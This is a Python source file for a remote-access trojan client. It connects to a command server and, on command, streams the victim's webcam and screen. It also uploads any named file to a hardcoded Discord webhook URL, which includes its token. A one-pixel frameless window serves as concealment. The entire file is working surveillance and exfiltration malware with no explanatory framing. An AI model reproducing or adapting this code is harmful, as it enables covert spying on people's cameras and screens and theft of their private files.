import socket
import sys
import os
import cv2
import numpy as np
import pyautogui
import threading
import requests
from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout
from PyQt5.QtCore import Qt, QThread

# Global settings
SERVER_IP = "0.0.0.0"  # Connect to this IP (server address)
SERVER_PORT = 9999     # Connection port
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2'  # For sending files via Discord

# Client Socket
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Send the client to server
def send_data(data):
    client_socket.send(data)

# Stream webcam to server
def stream_webcam():
    cap = cv2.VideoCapture(0)  # Open webcam
    while True:
        ret, frame = cap.read()
        if ret:
            ret, jpeg = cv2.imencode('.jpg', frame)
            if ret:
                send_data(jpeg.tobytes())  # Send webcam data to server

# Stream screen to server
def stream_screen():
    while True:
        screenshot = pyautogui.screenshot()  # Capture screen
        screenshot = np.array(screenshot)
        ret, jpeg = cv2.imencode('.jpg', screenshot)
        if ret:
            send_data(jpeg.tobytes())  # Send screen data to server

# Main connection and listening
def start_connection():
    client_socket.connect((SERVER_IP, SERVER_PORT))
    print("Connected to server.")
    while True:
        data = client_socket.recv(1024)  # Receive commands from server
        if data == b"!webcam_stream":
            stream_webcam()
        elif data == b"!screen_stream":
            stream_screen()
        elif data.startswith(b"!download"):
            filename = data.split(b' ')[1].decode()
            with open(filename, "rb") as f:
                file_data = f.read()
                requests.post(DISCORD_WEBHOOK_URL, files={'file': (filename, file_data)})

# Thread to handle connection
connection_thread = threading.Thread(target=start_connection)
connection_thread.start()

# Run GUI (hidden)
def hide_gui():
    app = QApplication(sys.argv)
    window = QWidget()
    window.setWindowFlags(Qt.WindowStaysOnTopHint | Qt.FramelessWindowHint)
    window.setGeometry(0, 0, 1, 1)  # Invisible window
    window.show()
    app.exec_()

hide_thread = threading.Thread(target=hide_gui)
hide_thread.start()
